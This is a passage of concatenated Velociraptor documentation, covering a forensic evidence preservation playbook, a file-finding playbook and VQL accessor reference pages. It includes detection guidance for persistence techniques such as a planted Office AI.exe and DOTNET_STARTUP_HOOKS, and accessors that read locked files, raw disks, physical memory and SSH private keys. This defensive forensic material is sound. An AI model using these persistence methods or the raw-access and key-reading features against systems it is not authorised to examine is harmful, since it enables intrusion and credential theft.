![Encrypting the collected data](encryoted_collector.png)

You can also configure the offline collector to automatically upload
the collection to a cloud storage, such as `S3`, `Google Cloud
Storage` or a `Windows file share`.

## When to use this technique?

This technique should be used sparingly, usually targeting few
systems, as it can transfer a large amount of data.

Typically this technique is used when the endpoint is likely to be
destroyed (e.g. re-imaged) or become inaccessible in the near
future. The method is most suitable for preservation of raw data.

## When not to use this technique?

This workflow is not appropriate for triage. A triage workflow is
about discovering unknown compromised endpoints and therefore by
definition must be applied to a large number of endpoints. The
`Preserving Forensic Evidence` workflow can not be applied to a large
number of endpoints.

The traditional digital forensics workflow consists of the following
steps:

1. `Acquisition` step collects a large amount of raw data to a central
   server.
2. `Analysis` step applies parsers and various dedicated tools in a
   central "forensics workstation" on all the raw data collected.
3. `Interpretation` step involves examining the output from the
   various parsers to answer case specific questions.

Many newcomers to Velociraptor have been trained with this workflow
and try to apply it to Velociraptor.

However this centralist approach to digital forensics does not scale
in practice. When trying to apply this approach to a large network of
endpoints, users are often overwhelmed with data (it is almost a right
of passage for new Velociraptor users to completely fill their
server's disk because they tried to collect all the log files from all
the endpoints)

Velociraptor's philosophy is different:

1. Velociraptor considers the endpoint to be the ultimate source of truth.
2. Therefore we rarely need to fetch the raw data from the endpoint!
   Since Velociraptor can parse the raw data directly on the endpoint
   we prefer asking case relevant questions from the entire network
   directly.

To explain this point, let's consider an example where we want to know
if an executable file was recently downloaded onto the endpoint. We
will attempt to parse the USN Journal to answer this question.

The very traditional Digital Forensics process (i.e. back in the 90s)
would require acquiring a bit for bit disk image of the suspected
endpoint with a write blocker attached! Probably no-one does this any
more!

A more modern approach is to use a digital acquisition tool to copy
just the `C:\$Extend\$UsnJrnl:$J` file in it's entirety for
`Acquisition`, then apply a separate tool to parse the journal and
search for any files written to the disk with a `.exe` extension.

While this approach is better than acquiring the entire disk image
(Average disks are of the range of 1-2Tb these days), it still
requires collecting several hundred MB of data from each endpoint. If
you have 10,000 endpoints this quickly becomes intractable.

Velociraptor's approach is different: Since the endpoint is considered
the source of truth, we just directly run our analysis on the
endpoint. Collecting the `Windows.Forensics.Usn` artifact with a
`FileNameRegex` filter of `.exe$` will query each machine to parse
their own local copy of the USN journal to find all executables
directly.

We can collect this artifact using a hunt from the entire network at
once. Since each endpoint will be doing the analysis in parallel,
results will return in minutes regardless of how many endpoint there
are!

This is why we consider simple acquisition followed by central
analysis workflows to be inferior to directly collecting the right
artifacts.

You should use the `Preserving Forensic Evidence` workflow only on
systems that are known to have been compromised and you want to
preserve the raw files for some reason.

### Other considerations

When collecting raw files from the endpoint we need to make a tradeoff:

1. Collecting fewer files may miss some files that are needed later
   during analysis.
2. Collecting more files will result in larger collection.

Ultimately it is not possible to know in advance what type of evidence
may be relevant. For example, we might collect the `$MFT` in our
initial acquisition but subsequent analysis can show that certain
files are critical (e.g. files in the user's `Downloads` directory).

In a `Preserving Forensic Evidence` workflow we can not go back to the
source of truth and check the files in the `Downloads` directory!

Therefore it is always better to have Velociraptor already installed
on the endpoint so we can pivot during the analysis phase and get
additional information as required.

---END OF FILE---

======
FILE: /content/training/playbooks/finding_files/_index.md
======
---
title: "Finding Files"
weight: 50
description: |
    One of the most common tasks in DFIR is searching for files on the endpoint.

tags:
- preservation
- acquisition
- searching
---

## Scenario

One of the most common operations in DFIR is searching for files
efficiently. When searching for a file, we may search by filename,
file content, size or other properties.

## Main takeaways

1. This technique can be used to find files on the endpoint.
2. Turning this into a hunt can search for a file across the entire fleet in minutes.
3. You can transfer the content of the file or just detect its presence.


## Steps to take

The most common artifacts to use are:

1. `Windows.Search.FileFinder` or `Linux.Search.FileFinder`
2. `Windows.NTFS.MFT`

## More details

The `Windows.Search.FileFinder` is the Swiss army knife of file
searching.

![The File Finder artifact](file_finder.svg)

You can use the `File Finder` artifacts to find files by several criteria:

1. File names: Adding one or more Glob expressions (i.e. expressions
   with wildcards) will search for files by name.

2. In addition to the filename, you can restrict the file by times -
   by adding a time box (before and after times), only files with any
   of their timestamps inside the time box will be selected.

   This allows us to restrict questions to "only files added in the past week"

3. You can search file content by adding a Yara rule. Yara is a simple
   matching language allowing sophisticated search expressions.

   By pressing `?` inside the Yara editor, Velociraptor will suggest a
   Yara template you can use to get started.

![A simple template Yara rule can be added by pressing ? in the editor](yara_rule.png)

4. Matching files can be uploaded to the server. NOTE: This may
   generate a lot of traffic so it is only suitable for a small number
   of very targeted matches. Alternatively simply calculate the hash
   of matching files.

The artifact also supports Windows Volume Shadow Copies, if
available. Velociraptor will automatically deduplicate VSS so only a
single file match will be reported, even if the same file exists in
multiple VSS snapshots - unless the file is changed between them.

{{% notice tip "Searching the registry" %}}

Although the artifact is named `File Finder`, the artifact can also be
used to search for registry keys and values. This is because
Velociraptor accesses files by way of an `accessor`. The accessor
abstracts access for files and file-like objects.

In Velociraptor the `registry` accessor makes the registry appear as a
filesystem: Registry keys appear as directories and Registry Values
appear as Files (with binary content).

This allows the File Finder to search the registry as well - simply
change the `Accessor` option from `auto` to `registry` to search the
registry. Remember, top level directory is the registry hive, for
example `HKLM`, or `HKEY_LOCAL_MACHINE`

{{% /notice %}}


### Example: Detect persistence

Office executables like `WINWORD.exe` look for `AI.exe` under the
`%ProgramFiles%\Microsoft Office\root\<Office Version>` and
`%ProgramFiles(x86)%\Microsoft Office\root\<Office Version>`
directories.  An attacker may place a malicious `AI.exe` there in order
to have persistence whenever a user interacts with the Microsoft
Office Suite.  [1](https://twitter.com/laughing_mantis/status/1645268114966470662), [2](https://github.com/last-byte/PersistenceSniper/blob/main/PersistenceSniper/PersistenceSniper.psm1)

Search for file glob `C:\Program File*\Microsoft Office\root\Office*\ai.exe` and hash it.

### Example: Detect registry keys

The .NET DLLs listed in the `DOTNET_STARTUP_HOOKS` environment variable
are loaded into .NET processes at runtime.
[1](https://persistence-info.github.io/Data/dotnetstartuphooks.html),
[2](https://github.com/last-byte/PersistenceSniper/blob/main/PersistenceSniper/PersistenceSniper.psm1)

Solution: Change the Accessor to "registry" and search for the following globs.

1. `HKEY_USERS\*\Environment\DOTNET_STARTUP_HOOKS`
2. `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment\DOTNET_STARTUP_HOOKS`

Select `Upload file` to view the content of the matching values.


### Example: Detect Mark of the Web files

When files are downloaded from the internet, browsers will add an
Alternate Data Stream (ADS) to the file called `Zone.Identifier`. This
stream will contain additional information about where the file was
downloaded from.

Solution:

1. Change the accessor to `ntfs` which will allow us to see
Alternate Data Streams (ADS).
2. Search for files containing the `Zone.Identifier` (ADS names are
   appended to the filename with a colon): `C:\Users\*\Downloads\**\*:Zone.Identifier`
3. Enable uploading to get the data.
4. You can preview the data within the GUI in the `Uploaded Files` tab.

{{% notice tip "Using dedicated artifacts" %}}

You can also use `Windows.NTFS.ADSHunter` or
`Exchange.Windows.Detection.ZoneIdentifier` to further parse the
contents of the `Zone.Identifier` stream.

{{% /notice %}}

## Performance

Searching for files can be an expensive operation, using a lot of CPU
and IO resources on the end point. Some rules of thumb:

1. Searching by filename is fairly cheap.
2. It is better if you can narrow down the number of directories we
   have to scan. For example rather than search
   `C:/**/*:Zone.Identifier`, limit to search to only user files
   `C:/Users/**/*:Zone.Identifier`
3. It is expensive to search the content of files with a Yara rule.

   For example instead of searching for `C:/**` then applying a Yara
   rule looking for an executable, it is better to first narrow the
   glob to `C:/**/*.exe` and even time box it further. The File Finder
   artifact prioritizes cheaper operations like filename or
   modification time checks before attempting to apply a Yara scan.

---END OF FILE---

======
FILE: /content/vql_reference/_index.md
======
---
title: "VQL Reference"
menutitle: VQL Reference
date: 2021-06-12T05:12:26Z
draft: false
weight: 60
noDisqus: true
no_edit: true
disableToc: true
chapter: false
pre: <i class="fas fa-book"></i>
head: <hr>
---

{{% expand "This page lists all the plugins, functions and accessors which are available in Velociraptor." %}}

- **Plugins** are the data sources of VQL queries. While SQL queries refer to
static tables of data, VQL queries refer to plugins, which generate data rows to
be filtered by the query. Unlike SQL, VQL plugins also receive keyword
arguments. When the plugin is evaluated it simply generates a sequence of rows
which are further filtered by the query. This allows VQL statements to be
chained naturally since plugin args may also be other queries.
- **Functions** are used to transform the data returned by plugins. They
return (transformed) values, not rows.
- **Accessors** are used to access bulk data from various sources using a
standard file-like interface.

{{% notice note %}}

VQL _plugins_ are not the same as VQL _functions_. A helpful 'rule of thumb' is
that plugins always follow the `FROM` keyword because they generate a table
consisting of rows from the data source, while functions (which return a single
value instead of a sequence of rows) are only present in column specifications
(i.e. after `SELECT`) or in condition clauses (i.e. after the `WHERE` keyword).

{{% /notice %}}

{{% notice tip %}}

If you are not exactly sure what you're looking for or just want to browse
what's available, we have also provided listings by general categories [which you
can access in the sidebar](/vql_reference/popular/).

{{% /notice %}}

{{% /expand %}}

{{% reference %}}

---END OF FILE---

======
FILE: /content/vql_reference/accessors/_index.md
======
---
title: Accessors
weight: 100
linktitle: Accessors
index: true
no_edit: true
no_children: true
---

Accessors are used to access bulk data from various sources using a standard
file-like interface.
|Plugin/Function|<span class='vql_type'>Type</span>|Description|
|-|-|-|
|[auto](auto)|<span class='vql_type'>Accessor</span>|Access the file using the best accessor possible|
|[bzip2](bzip2)|<span class='vql_type'>Accessor</span>|Access the content of bzip2 files|
|[collector](collector)|<span class='vql_type'>Accessor</span>|Open a collector zip file as if it was a directory - automatically|
|[collector_sparse](collector_sparse)|<span class='vql_type'>Accessor</span>|Open a collector zip file as if it was a directory|
|[data](data)|<span class='vql_type'>Accessor</span>|Makes a string appears as an in memory file|
|[ewf](ewf)|<span class='vql_type'>Accessor</span>|Allow reading an EWF file|
|[ext4](ext4)|<span class='vql_type'>Accessor</span>|Access files by parsing the raw ext4 filesystems|
|[fat](fat)|<span class='vql_type'>Accessor</span>|Access the FAT filesystem inside an image by parsing FAT|
|[file](file)|<span class='vql_type'>Accessor</span>|Access files using the operating system's API|
|[file_links](file_links)|<span class='vql_type'>Accessor</span>|Access the filesystem using the OS APIs|
|[file_nocase](file_nocase)|<span class='vql_type'>Accessor</span>|Access files using the operating system's API|
|[fs](fs)|<span class='vql_type'>Accessor</span>|Provide access to the server's filestore and datastore|
|[fs_sparse](fs_sparse)|<span class='vql_type'>Accessor</span>|Provide access to the server's filestore and datastore|
|[gzip](gzip)|<span class='vql_type'>Accessor</span>|Access the content of gzip files|
|[lazy_ntfs](lazy_ntfs)|<span class='vql_type'>Accessor</span>|Access the NTFS filesystem by parsing NTFS structures|
|[me](me)|<span class='vql_type'>Accessor</span>|Access files bundled inside the Velociraptor binary itself|
|[mft](mft)|<span class='vql_type'>Accessor</span>|The `mft` accessor is used to access arbitrary MFT streams as|
|[mscfb](mscfb)|<span class='vql_type'>Accessor</span>|Parse a MSCFB file as an archive|
|[ntfs](ntfs)|<span class='vql_type'>Accessor</span>|Access the NTFS filesystem by parsing NTFS structures|
|[ntfs_vss](ntfs_vss)|<span class='vql_type'>Accessor</span>|Access the NTFS filesystem by considering all VSS|
|[offset](offset)|<span class='vql_type'>Accessor</span>|Allow reading another file from a specific offset|
|[pipe](pipe)|<span class='vql_type'>Accessor</span>|Read from a VQL pipe|
|[process](process)|<span class='vql_type'>Accessor</span>|Access process memory like a file|
|[pst](pst)|<span class='vql_type'>Accessor</span>|An accessor to open attachments in PST files|
|[ranged](ranged)|<span class='vql_type'>Accessor</span>|Reconstruct sparse files from idx and base|
|[raw_ext4](raw_ext4)|<span class='vql_type'>Accessor</span>|Access the Ext4 filesystem inside an image by parsing the image|
|[raw_file](raw_file)|<span class='vql_type'>Accessor</span>|Access the filesystem using the OS API|
|[raw_ntfs](raw_ntfs)|<span class='vql_type'>Accessor</span>|Access the NTFS filesystem inside an image by parsing NTFS|
|[raw_reg](raw_reg)|<span class='vql_type'>Accessor</span>|Access keys and values by parsing a raw registry hive|
|[reg](reg)|<span class='vql_type'>Accessor</span>|Access the registry like a filesystem using the OS APIs|
|[registry](registry)|<span class='vql_type'>Accessor</span>|Access the registry like a filesystem using the OS APIs|
|[s3](s3)|<span class='vql_type'>Accessor</span>|Allows access to S3 buckets|
|[scope](scope)|<span class='vql_type'>Accessor</span>|Present the content of a scope variable as a file|
|[smb](smb)|<span class='vql_type'>Accessor</span>|Access smb shares (e|
|[sparse](sparse)|<span class='vql_type'>Accessor</span>|Allows reading another file by overlaying a sparse map on top of|
|[ssh](ssh)|<span class='vql_type'>Accessor</span>|Access a remote system's filesystem via `SSH/SFTP`|
|[vfs](vfs)|<span class='vql_type'>Accessor</span>|Access client's VFS filesystem on the server|
|[vhdx](vhdx)|<span class='vql_type'>Accessor</span>|Allow reading a VHDX file|
|[vmdk](vmdk)|<span class='vql_type'>Accessor</span>|Allow reading a VMDK file|
|[winpmem](winpmem)|<span class='vql_type'>Accessor</span>|Access physical memory like a file|
|[zip](zip)|<span class='vql_type'>Accessor</span>|Open a zip file as if it was a directory|
|[zip_nocase](zip_nocase)|<span class='vql_type'>Accessor</span>|Open a zip file as if it was a directory|

---END OF FILE---

======
FILE: /content/vql_reference/accessors/pst/_index.md
======
---
title: pst
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## pst
<span class='vql_type label label-warning pull-right page-header'>Accessor</span>


### Description

An accessor to open attachments in PST files.

This accessor allows opening of attachments for scanning or reading.

The OSPath used is structured in the form:

{
  Path: "Msg/<msg_id>/Att/<attach_id>/filename",
  DelegatePath: <path to PST file>,
  DelegateAccessor: <accessor for PST file>
}





---END OF FILE---

======
FILE: /content/vql_reference/accessors/sparse/_index.md
======
---
title: sparse
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## sparse
<span class='vql_type label label-warning pull-right page-header'>Accessor</span>


### Description

Allows reading another file by overlaying a sparse map on top of
it.

The map excludes reading from certain areas which are considered
sparse.

The resulting file is sparse (and therefore uploading it excludes
the masked out regions). The filename is taken as a list of
ranges.

For example here we create a sparse file over the delegate which only
defines the first 5 bytes, then a 5 byte sparse region then another 5
bytes.

```vql
SELECT upload(accessor="sparse", path=pathspec(
  DelegateAccessor="data", DelegatePath=MyData,
  Path=[dict(Offset=0,Length=5), dict(Offset=10,Length=5)])
FROM scope()
```

The uploaded file will contain only 10 bytes but will retain the 5
byte "hole" in the middle.

This accessor is most useful when uploading or masking parts of other
files - for example uploading a carved files from a larger image. Note
that delegate offsets are retained in this accessor (so for example
offset 10 in this accessor corresponds to offset 10 in the delegate
regardless of the sparse map).

For more flexibility than this use the "ranged" accessor.



---END OF FILE---

======
FILE: /content/vql_reference/accessors/mscfb/_index.md
======
---
title: mscfb
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## mscfb
<span class='vql_type label label-warning pull-right page-header'>Accessor</span>


### Description

Parse a MSCFB file as an archive.



---END OF FILE---

======
FILE: /content/vql_reference/accessors/auto/_index.md
======
---
title: auto
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## auto
<span class='vql_type label label-warning pull-right page-header'>Accessor</span>


### Description

Access the file using the best accessor possible.

The `auto` accessor is the default accessor that is used when a VQL
query does not specify an `accessor` parameter.

On Windows it attempts to open the file using the `file` accessor and
if that fails (for example due to permission errors), the `auto`
accessor automatically tries the `ntfs` accessor to access the file
using raw level filesystem parsing.

The overall effect is that the Velociraptor is able to transparently
access files that are locked (for example registry hives) or are
protected by filter drivers (e.g. some endpoint security software). In
general you should use the `auto` accessor to open files on the local
filesystem in all cases since it will be much faster than using the
`ntfs` accessor for every file (most files are not actually locked).

On other operating systems, the `auto` accessor is an alias to the
`file` accessor.



---END OF FILE---

======
FILE: /content/vql_reference/accessors/winpmem/_index.md
======
---
title: winpmem
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## winpmem
<span class='vql_type label label-warning pull-right page-header'>Accessor</span>


### Description

Access physical memory like a file. Any filename will result in a sparse view of physical memory.


---END OF FILE---

======
FILE: /content/vql_reference/accessors/scope/_index.md
======
---
title: scope
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## scope
<span class='vql_type label label-warning pull-right page-header'>Accessor</span>


### Description

Present the content of a scope variable as a file.

Similar to the `data` accessor, this makes a string appears as the
file contents. However, instead of the filename itself containing
the file content, the filename refers to the name of a variable in
the current scope that contains the data.

This is useful when the binary data is not unicode safe and can
not be properly represented by JSON. Sometimes the filename is
echoed in various log messages and with the `data` accessor this
will echo some binary data into the logs.

### Example

```vql
LET MyData <= "This is a test string"

SELECT read_file(accessor="scope", filename="MyData") FROM scope()
```



---END OF FILE---

======
FILE: /content/vql_reference/accessors/file_links/_index.md
======
---
title: file_links
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## file_links
<span class='vql_type label label-warning pull-right page-header'>Accessor</span>


### Description

Access the filesystem using the OS APIs.

Note: Take care with this accessor because there may be circular
links. In particular this is dangerous on Linux when accidentally
entering the `/proc` part of the filesystem because it contains
circular links to everywhere.



---END OF FILE---

======
FILE: /content/vql_reference/accessors/raw_file/_index.md
======
---
title: raw_file
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## raw_file
<span class='vql_type label label-warning pull-right page-header'>Accessor</span>


### Description

Access the filesystem using the OS API.

This accessor allows to read raw devices. On Windows, raw files
need to be read in aligned page size. This accessor ensures reads
are buffered into page size buffers to make it safe for VQL to
read the device in arbitrary alignment.

We do not support directory operations on raw devices, so this
accessor can not be used in the `glob()` plugin.

Additionally this accessor does not attempt to interpret the
device part of the path components. It will pass the full path
string to the underlying OS APIs. This allows us to read arbitrary
devices.



---END OF FILE---

======
FILE: /content/vql_reference/accessors/ext4/_index.md
======
---
title: ext4
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## ext4
<span class='vql_type label label-warning pull-right page-header'>Accessor</span>


### Description

Access files by parsing the raw ext4 filesystems.

This accessor is designed to operate on a live system. It
automatically enumerates the mount points and attaches a raw ext4
mount to each mounted device.

Users can use the same path as is presented on the real system, but
the raw ext4 partitions will be parsed instead.

This accessor is only available under linux.

### Example

```vql
SELECT *
FROM glob(globs='/boot/*', accessor="ext4")
```



---END OF FILE---

======
FILE: /content/vql_reference/accessors/collector_sparse/_index.md
======
---
title: collector_sparse
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## collector_sparse
<span class='vql_type label label-warning pull-right page-header'>Accessor</span>


### Description

Open a collector zip file as if it was a directory.

Same as the `collector` accessor but does not expand sparse files.



---END OF FILE---

======
FILE: /content/vql_reference/accessors/ssh/_index.md
======
---
title: ssh
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## ssh
<span class='vql_type label label-warning pull-right page-header'>Accessor</span>


### Description

Access a remote system's filesystem via `SSH/SFTP`.

This accessor allows accessing remote systems via `SFTP/SSH`.  This is
useful for being able to search remote systems where it is not
possible to run a Velociraptor client directly on the endpoint. For
example, on embedded edge devices such as routers/firewalls/VPN
servers etc.

To use this accessor you will need to provide credentials via the
SSH_CONFIG scope variable:

```vql
LET SSH_CONFIG <= dict(hostname='localhost:22',
  username='mic',
  private_key=read_file(filename='/home/user/.ssh/id_rsa'))

SELECT OSPath FROM glob(accessor="ssh", globs="/*")
```

### Notes

1. hostname must have a port after the column.
2. You can provide a password instead of a private key via the
   password parameter to the `SSH_CONFIG`
3. The private_key parameter must contain an unencrypted PEM encoded
   SSH private key pair.

It is more convenient to use the [secrets support]({{< ref
"/blog/2024/2024-03-10-release-notes-0.72/#secret-management" >}}) in
0.72 to manage these credentials.



---END OF FILE---

======
FILE: /content/vql_reference/accessors/fat/_index.md
======
---
title: fat
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## fat
<span class='vql_type label label-warning pull-right page-header'>Accessor</span>


### Description

Access the FAT filesystem inside an image by parsing FAT.

This accessor is designed to operate on images directly. It requires a
delegate accessor to get the raw image and will open files using the
FAT full path rooted at the top of the filesystem.

### Example

The following query will glob all the files under the directory 'a'
inside a FAT image file

```vql
SELECT *
FROM glob(globs='/**',
  accessor="fat",
  root=pathspec(
    Path="a",
    DelegateAccessor="file",
    DelegatePath='fat.dd'))
```



---END OF FILE---

======
FILE: /content/vql_reference/accessors/gzip/_index.md
======
---
title: gzip
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## gzip
<span class='vql_type label label-warning pull-right page-header'>Accessor</span>


### Description

Access the content of gzip files.

The filename is a pathspec with a delegate accessor opening the
actual gzip file.

Since `gzip` compressed files do not have an actual file hierarchy,
they can not be directly searched with `glob()`. This accessor is
therefore only really useful for opening the file for reading - or for
chaining with another accessor.

```vql
SELECT read_file(accessor="gzip", filename="F:/hello.txt.gz", length=10)
FROM scope()
```

Performance: `GZIP` files are non-seekable. This means they must be
read in sequence from start to finish. If the VQL query attempts to
seek within the file, this accessor will automatically decompress the
entire file into a temporary file so it can seek within it. This means
that performance can be extremely bad in some cases.



---END OF FILE---

======
FILE: /content/vql_reference/accessors/collector/_index.md
======
---
title: collector
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## collector
<span class='vql_type label label-warning pull-right page-header'>Accessor</span>


### Description

Open a collector zip file as if it was a directory - automatically
expand sparse files.

Open an offline collector zip file as if it was a directory. This
is similar to the `zip` accessor (see below) but it automatically
decrypts collections protected using the x509 scheme. Use this
accessor to transparently read inside encrypted collections.

This accessor also automatically expands sparse files by zero
padding them (when possible - if zero padding is unreasonable
large for this file, we do not expand it).



---END OF FILE---

======
FILE: /content/vql_reference/accessors/file/_index.md
======
---
title: file
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## file
<span class='vql_type label label-warning pull-right page-header'>Accessor</span>


### Description

Access files using the operating system's API.

Does not allow access to raw devices.

### Notes

This accessor does not follow symbolic links on `Windows` or
`Linux` in order to avoid being trapped by cycles. This means that
on some Linux systems you will find `/usr/bin/ls` instead of
`/bin/ls` since `/bin` is a symlink to `/usr/bin/`



---END OF FILE---

======
FILE: /content/vql_reference/accessors/vmdk/_index.md
======
---
title: vmdk
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## vmdk
<span class='vql_type label label-warning pull-right page-header'>Accessor</span>


### Description

Allow reading a VMDK file.

This accessor allows access to the content of VMDK files. Note
that usually VMDK files are disk images with a partition table and
an NTFS volume. You will usually need to wrap this accessor with a
suitable Offset (to account for the partition) and parse it with
the the "raw_ntfs" accessor.

The VMDK file should be the metadata file (i.e. not the extent
files).  The extent files are expected to be in the same directory
as the metadata file and this accessor will open them separately.

### Example

```vql
SELECT OSPath.Path AS OSPath, Size, Mode.String
FROM glob(
  globs="*", accessor="raw_ntfs", root=pathspec(
    Path="/",
    DelegateAccessor="offset",
    DelegatePath=pathspec(
      Path="/65536",
      DelegateAccessor="vmdk",
      DelegatePath="/tmp/test.vmdk")))
```




---END OF FILE---

======
FILE: /content/vql_reference/accessors/raw_reg/_index.md
======
---
title: raw_reg
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## raw_reg
<span class='vql_type label label-warning pull-right page-header'>Accessor</span>


### Description

Access keys and values by parsing a raw registry hive.

Path is a OSPath having delegate opening the raw registry hive.

For example we can search the raw registry for the System hive:

```vql
SELECT OSPath
FROM glob(globs='*',
    accessor="raw_reg",
    root=pathspec(
      Path="ControlSet001",
      DelegateAccessor="auto",
      DelegatePath="C:/Windows/System32/config/System"))
```

This accessor is available on all supported platforms and uses the
internal raw registry parser.



---END OF FILE---

======
FILE: /content/vql_reference/accessors/raw_ntfs/_index.md
======
---
title: raw_ntfs
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## raw_ntfs
<span class='vql_type label label-warning pull-right page-header'>Accessor</span>


### Description

Access the NTFS filesystem inside an image by parsing NTFS.

This accessor is designed to operate on images directly. It requires a
delegate accessor to get the raw image and will open files using the
NTFS full path rooted at the top of the filesystem.

### Example

The following query will open the $MFT file from the raw image file
that will be accessed using the file accessor.

```vql
SELECT * FROM parse_mft(
  filename=pathspec(
    Path="$MFT",
    DelegateAccessor="file",
    DelegatePath='ntfs.dd'),
  accessor="raw_ntfs")
```

Note that this accessor is different than the standard `ntfs`
accessor which attempts to emulate the simpler `file`
accessor. This is so the paths can be easily interchanged between
`file` and `ntfs`.

The `ntfs` accessor automatically calculates the raw device needed
to open the ntfs partition. The following queries are equivalent:

```
SELECT * FROM parse_mft(
  filename=pathspec(
    Path="$MFT",
    DelegateAccessor="raw_file",
    DelegatePath='''\\.\C:'''),
  accessor="raw_ntfs")

SELECT * FROM parse_mft(
  filename='''\\.\C:\$MFT''',
  accessor="ntfs")
```

The `raw_ntfs` accessor is available in all supported platforms
(i.e. not only Windows) and uses the same filesystem parser as the
`ntfs` accessor. You can use this in conjunction with the
`remap()` function to analyse raw NTFS volumes on any supported
platform.



---END OF FILE---

======
FILE: /content/vql_reference/accessors/me/_index.md
======
---
title: me
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## me
<span class='vql_type label label-warning pull-right page-header'>Accessor</span>


### Description

Access files bundled inside the Velociraptor binary itself.

The `me` accessor is used to retrieve files packed inside the
Velociraptor binary (for example in the offline
collector). Currently this is similar to the zip accessor but it
might change in future. Do not use this accessor directly, instead
use the supported `Generic.Utils.FetchBinary` artifact to retrieve
packed files.

This is used for unpacking extra files delivered by the Offline
Collector and is probably not generally useful.



---END OF FILE---

======
FILE: /content/vql_reference/accessors/raw_ext4/_index.md
======
---
title: raw_ext4
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## raw_ext4
<span class='vql_type label label-warning pull-right page-header'>Accessor</span>


### Description

Access the Ext4 filesystem inside an image by parsing the image.

This accessor is designed to operate on images directly. It requires a
delegate accessor to get the raw image and will open files using the
FAT full path rooted at the top of the filesystem.

### Example

The following query will glob all the files under the directory 'a'
inside a Ext4 image file:

```vql
SELECT *
FROM glob(globs='/**',
  accessor="raw_ext4",
  root=pathspec(
    Path="a",
    DelegateAccessor="file",
    DelegatePath='ext4.dd'))
```




---END OF FILE---

======
FILE: /content/vql_reference/accessors/ntfs/_index.md
======
---
title: ntfs
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## ntfs
<span class='vql_type label label-warning pull-right page-header'>Accessor</span>


### Description

Access the NTFS filesystem by parsing NTFS structures.

This accessor uses an NTFS parser to present the content of the
NTFS filesystem as a simple filesystem. It emulates the regular
`file` accessor and its interpretation of the paths:

1. At the top level of the filesystem, this accessor enumerates all
fixed drives and VSS devices to present a list of valid devices
that may be parsed. For example a glob of `/*` gives:

- `\\.\C:` - The C drive device
- `\\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1` - The first VSS device.

2. The accessor will automatically convert from Windows paths to
NTFS paths. For example the path `C:/Windows` will be converted to
`\\.\C:\Windows`

This accessor is only available on Windows.

See the `raw_ntfs` accessor for more information and comparisons.



---END OF FILE---

======
FILE: /content/vql_reference/accessors/fs_sparse/_index.md
======
---
title: fs_sparse
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## fs_sparse
<span class='vql_type label label-warning pull-right page-header'>Accessor</span>


### Description

Provide access to the server's filestore and datastore.

This accessor expands sparse files. Reading from a sparse region
will result in zeros being returned.



---END OF FILE---

======
FILE: /content/vql_reference/accessors/zip_nocase/_index.md
======
---
title: zip_nocase
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## zip_nocase
<span class='vql_type label label-warning pull-right page-header'>Accessor</span>


### Description

Open a zip file as if it was a directory.

Although zip files are case-sensitive, this accessor treats file
names inside the zip file as case-insensitive. This is useful when
remapping an offline collector from a Windows system for post
processing.



---END OF FILE---

======
FILE: /content/vql_reference/accessors/bzip2/_index.md
======
---
title: bzip2
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## bzip2
<span class='vql_type label label-warning pull-right page-header'>Accessor</span>


### Description

Access the content of bzip2 files.

The bzip2 accessor is able to read the content of `bz2` compressed
files. It is very similar to the `gzip` accessor.

Since `bzip2` compressed files do not have an actual file hierarchy,
they can not be directly searched with `glob()`. This accessor is
therefore only really useful for opening the file for reading - or for
chaining with another accessor.

```vql
SELECT read_file(accessor="bzip2", filename="F:/hello.txt.bz2", length=10)
FROM scope()
```

Performance: Bzip2 files are non-seekable. This means they must be
read in sequence from start to finish. If the VQL query attempts to
seek within the file, this accessor will automatically decompress the
entire file into a temporary file so it can seek within it. This means
that performance can be extremely bad in some cases.



---END OF FILE---

======
FILE: /content/vql_reference/accessors/lazy_ntfs/_index.md
======
---
title: lazy_ntfs
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## lazy_ntfs
<span class='vql_type label label-warning pull-right page-header'>Accessor</span>


### Description

Access the NTFS filesystem by parsing NTFS structures.

This accessor is a variation of the `ntfs` accessor. It is a bit
faster because it does not enumerate all the attributes in files
contained in directories, instead relying only on the `I30` index
streams. This means it is unable to find Alternate Data Streams in
directories (because ADS are not stored in the I30 stream).

Usually the extra performance is not worth these limitations since the
`ntfs` accessor is pretty fast these days already.



---END OF FILE---

======
FILE: /content/vql_reference/accessors/vhdx/_index.md
======
---
title: vhdx
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## vhdx
<span class='vql_type label label-warning pull-right page-header'>Accessor</span>


### Description

Allow reading a VHDX file.

This accessor allows access to the content of VHDX files. Note that usually
VHDX files are disk images with a partition table and an NTFS volume. You
will usually need to wrap this accessor with a suitable Offset (to account
for the partition) and parse it with the the "raw_ntfs" accessor.

### Example

```vql
SELECT OSPath.Path AS OSPath, Size, Mode.String
FROM glob(
   globs="*", accessor="raw_ntfs", root=pathspec(
     Path="/",
     DelegateAccessor="offset",
     DelegatePath=pathspec(
       Path="/65536",
       DelegateAccessor="vhdx",
       DelegatePath="/tmp/test.vhdx")))
```




---END OF FILE---

======
FILE: /content/vql_reference/accessors/vfs/_index.md
======
---
title: vfs
index: true
noTitle: true
